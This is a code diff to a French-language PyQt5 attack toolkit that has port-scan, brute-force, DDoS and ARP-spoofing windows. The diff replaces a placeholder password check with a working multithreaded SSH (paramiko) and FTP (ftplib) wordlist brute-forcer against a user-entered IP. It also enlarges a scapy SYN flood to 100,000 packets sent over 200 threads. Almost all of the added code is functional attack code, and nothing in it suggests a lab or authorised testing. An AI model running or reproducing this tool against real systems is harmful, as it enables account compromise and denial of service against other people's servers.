@@ -1,5 +1,11 @@
 import sys
 import PyQt5
+import paramiko
+from ftplib import FTP, error_perm
+import concurrent.futures
+from concurrent.futures import ThreadPoolExecutor
+import time
+import threading
 
 from PyQt5.QtWidgets import (
     QApplication,
@@ -13,6 +19,7 @@ from PyQt5.QtWidgets import (
     QSpacerItem,
     QLineEdit,
     QFileDialog,
+    QHBoxLayout,
 )
 from PyQt5.QtCore import Qt
 from scapy.all import IP, TCP, sr1, send, Ether, ARP, getmacbyip, sendp
@@ -109,105 +116,117 @@ class PortScanWindow(QWidget):
 class BruteForceWindow(QWidget):
     def __init__(self):
         super().__init__()
-        self.setWindowTitle("Brute Force")
-        self.setGeometry(150, 150, 400, 400)
+        self.setWindowTitle("Brute Force SSH/FTP")
+        self.setGeometry(150, 150, 400, 300)
         self.initUI()
 
     def initUI(self):
         layout = QVBoxLayout()
 
-        # Champ pour l'adresse IP
+        # Section pour entrer une adresse IP
+        ip_layout = QHBoxLayout()
         self.ip_input = QLineEdit(self)
-        self.ip_input.setPlaceholderText("Entrez l'adresse IP")
-        layout.addWidget(self.ip_input)
+        self.ip_input.setPlaceholderText("Entrez l'adresse IP cible")
+        ip_layout.addWidget(QLabel("Adresse IP :"))
+        ip_layout.addWidget(self.ip_input)
 
-        # Champ pour le port
-        self.selected_port = None
+        layout.addLayout(ip_layout)
 
-        label = QLabel("Sélectionnez le port cible :")
-        layout.addWidget(label)
+        # Section pour sélectionner un port
+        port_layout = QHBoxLayout()
+        self.port_input = QLineEdit(self)
+        self.port_input.setPlaceholderText("Sélectionner le bouton SSH ou FTP")
+        port_layout.addWidget(QLabel("Port :"))
+        port_layout.addWidget(self.port_input)
 
-        # Définir les ports intéressants
-        self.ports_buttons = {
-            "SSH (22)": 22,
-            "FTP (21)": 21,
-            "HTTP (80)": 80,
-            "HTTPS (443)": 443,
-            "Telnet (23)": 23,
-            "MySQL (3306)": 3306,
-            "RDP (3389)": 3389,
-        }
+        layout.addLayout(port_layout)
 
-        # Création des boutons pour les ports
-        for port_name, port_number in self.ports_buttons.items():
-            button = QPushButton(port_name)
-            button.setCheckable(True)
-            button.setStyleSheet("background-color: lightgray;")
-            button.clicked.connect(lambda checked, port=port_number, btn=button: self.toggle_port_selection(port, btn))
-            layout.addWidget(button)
+        # Boutons pour SSH et FTP
+        protocol_layout = QHBoxLayout()
+        ssh_button = QPushButton("SSH (22)", self)
+        ssh_button.clicked.connect(lambda: self.set_port(22))
+        protocol_layout.addWidget(ssh_button)
+
+        ftp_button = QPushButton("FTP (21)", self)
+        ftp_button.clicked.connect(lambda: self.set_port(21))
+        protocol_layout.addWidget(ftp_button)
+
+        layout.addLayout(protocol_layout)
 
         # Champ pour l'utilisateur
         self.user_input = QLineEdit(self)
         self.user_input.setPlaceholderText("Entrez l'utilisateur")
         layout.addWidget(self.user_input)
 
-        # Champ pour le mot de passe avec bouton parcourir
-        self.password_input = QLineEdit(self)
-        self.password_input.setPlaceholderText("Parcourir pour le mot de passe")
-        self.password_input.setReadOnly(True)
-        layout.addWidget(self.password_input)
+        # Champ pour le fichier de mots de passe
+        self.password_file_input = QLineEdit(self)
+        self.password_file_input.setPlaceholderText("Parcourir pour le fichier de mots de passe")
+        self.password_file_input.setReadOnly(True)
+        layout.addWidget(self.password_file_input)
 
         # Bouton pour parcourir les fichiers de mots de passe
         btn_browse_passwords = QPushButton("Parcourir", self)
         btn_browse_passwords.clicked.connect(self.browse_passwords)
         layout.addWidget(btn_browse_passwords)
 
-        # Bouton pour exécuter le bruteforce
+        # Bouton pour exécuter le brute force
         self.btn_execute_bruteforce = QPushButton("Exécuter Bruteforce", self)
         self.btn_execute_bruteforce.clicked.connect(self.run_brute_force)
         layout.addWidget(self.btn_execute_bruteforce)
 
         self.setLayout(layout)
 
-    def toggle_port_selection(self, port, button):
-        if button.isChecked():
-            self.selected_port = port  # Mettre à jour le port sélectionné
-            # Décocher tous les autres boutons
-            for btn in self.findChildren(QPushButton):
-                if btn != button:
-                    btn.setChecked(False)
-        else:
-            self.selected_port = None
+    def set_port(self, port):
+        """ Définit le port sélectionné dans le champ de port. """
+        self.port_input.setText(str(port))
 
     def browse_passwords(self):
+        """ Permet de sélectionner un fichier contenant les mots de passe. """
         options = QFileDialog.Options()
-        password_file, _ = QFileDialog.getOpenFileName(self, "Sélectionner un fichier de mots de passe", "", "Text Files (*.txt);;All Files (*)", options=options)
+        password_file, _ = QFileDialog.getOpenFileName(
+            self, "Sélectionner un fichier de mots de passe", "", "Text Files (*.txt);;All Files (*)", options=options
+        )
         if password_file:
-            self.password_input.setText(password_file)
+            self.password_file_input.setText(password_file)
 
     def run_brute_force(self):
+        """ Exécute le processus de brute force avec les informations fournies. """
         ip = self.ip_input.text()
+        port = self.port_input.text() or "22"  # Port par défaut : 22
         user = self.user_input.text()
-        password_file = self.password_input.text()
+        password_file = self.password_file_input.text()
 
-        if not ip or not user or not password_file or self.selected_port is None:
+        # Validation des entrées
+        if not ip or not port or not user or not password_file:
             QMessageBox.warning(self, "Erreur", "Veuillez remplir tous les champs.")
             return
 
-        port = self.selected_port  # Utiliser le port sélectionné
+        try:
+            port = int(port)
+        except ValueError:
+            QMessageBox.warning(self, "Erreur", "Le port doit être un nombre valide.")
+            return
 
         try:
             with open(password_file, 'r') as file:
                 passwords = file.readlines()
 
-            for password in passwords:
-                password = password.strip()  # Supprimer les espaces et les nouvelles lignes
-                print(f"Tentative de connexion avec {user}:{password} sur {ip}:{port}")  # Afficher dans le terminal
+            with ThreadPoolExecutor(max_workers=10) as executor:
+                futures = {
+                    executor.submit(self.attempt_connection, ip, port, user, password.strip()): password.strip() 
+                    for password in passwords
+                }
 
-                if password == "secret":
-                    print(f"Connexion réussie avec {user}:{password} sur {ip}:{port}")
-                    QMessageBox.information(self, "Succès", f"Connexion réussie avec {user}:{password} sur {ip}:{port}")
-                    return
+                for future in futures:
+                    try:
+                        result = future.result()
+                        if result:
+                            QMessageBox.information(
+                                self, "Succès", f"Connexion réussie avec {user}:{result} sur {ip}:{port}"
+                            )
+                            return
+                    except Exception as e:
+                        print(f"Erreur lors de la tentative de connexion : {str(e)}")
 
             print("Aucun mot de passe valide trouvé.")
             QMessageBox.information(self, "Échec", "Aucun mot de passe valide trouvé.")
@@ -217,6 +236,48 @@ class BruteForceWindow(QWidget):
         except Exception as e:
             QMessageBox.warning(self, "Erreur", f"Une erreur est survenue : {str(e)}")
 
+    def attempt_connection(self, ip, port, user, password):
+        """ Tente une connexion SSH ou FTP. """
+        if port == 22:
+            if self.ssh_brute_force(ip, port, user, password):
+                return password
+        elif port == 21:
+            if self.ftp_brute_force(ip, port, user, password):
+                return password
+        return None
+
+    def ssh_brute_force(self, ip, port, user, password):
+        """ Tente une connexion SSH avec Paramiko. """
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        try:
+            client.connect(hostname=ip, port=port, username=user, password=password, timeout=5)
+            client.close()
+            return True
+        except paramiko.AuthenticationException:
+            print(f"Échec d'authentification avec {user}:{password}")
+            return False
+        except paramiko.SSHException as e:
+            print(f"Erreur SSH : {str(e)}")
+            return False
+        except Exception as e:
+            print(f"Erreur de connexion : {str(e)}")
+            return False
+
+    def ftp_brute_force(self, ip, port, user, password):
+        """ Tente une connexion FTP avec le module ftplib. """
+        try:
+            ftp = FTP()
+            ftp.connect(ip, port, timeout=5)
+            ftp.login(user, password)
+            ftp.quit()
+            return True
+        except error_perm:
+            print(f"Échec d'authentification avec {user}:{password} sur FTP")
+            return False
+        except Exception as e:
+            print(f"Erreur de connexion FTP : {str(e)}")
+            return False
 
 class DDoSWindow(QWidget):
     def __init__(self):
@@ -238,6 +299,10 @@ class DDoSWindow(QWidget):
 
         self.setLayout(layout)
 
+    def send_packet(self, target):
+        pkt = IP(dst=target) / TCP(dport=80, flags="S")
+        send(pkt, verbose=0)
+
     def execute_ddos(self):
         target = self.target_input.text()
         if not target:
@@ -246,11 +311,14 @@ class DDoSWindow(QWidget):
 
         # Logique DDoS 
         try:
-            pkt = IP(dst=target) / TCP(dport=80, flags="S")
-            for i in range(10000): 
-                send(pkt, verbose=0)
-                print(f"Paquet {i+1} envoyé à {target}.")  # Imprimer pour le suivi
-            QMessageBox.information(self, "DDoS", f"DDoS envoyé vers {target}.")
+            start_time = time.time()  # Mesurer le temps d'exécution
+            with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:  # Ajuster le nombre de threads
+                futures = [executor.submit(self.send_packet, target) for _ in range(100000)]
+                for future in concurrent.futures.as_completed(futures):
+                    pass  # Just wait for the threads to finish
+
+            elapsed_time = time.time() - start_time
+            QMessageBox.information(self, "DDoS", f"DDoS envoyé vers {target}.\nTemps écoulé : {elapsed_time:.2f} secondes.")
         except Exception as e:
             QMessageBox.warning(self, "Erreur", f"Erreur lors de l'exécution du DDoS : {str(e)}")
 
@@ -359,7 +427,7 @@ class MainWindow(QMainWindow):
         btn_arp_spoofing.clicked.connect(self.open_arp_spoofing)
         layout.addWidget(btn_arp_spoofing)
 
-        btn_execute_all = QPushButton("Exécuter Tout", self)
+        btn_execute_all = QPushButton("Déployer toutes les fonctionnalités", self)
         btn_execute_all.clicked.connect(self.execute_all)
         layout.addWidget(btn_execute_all)
 
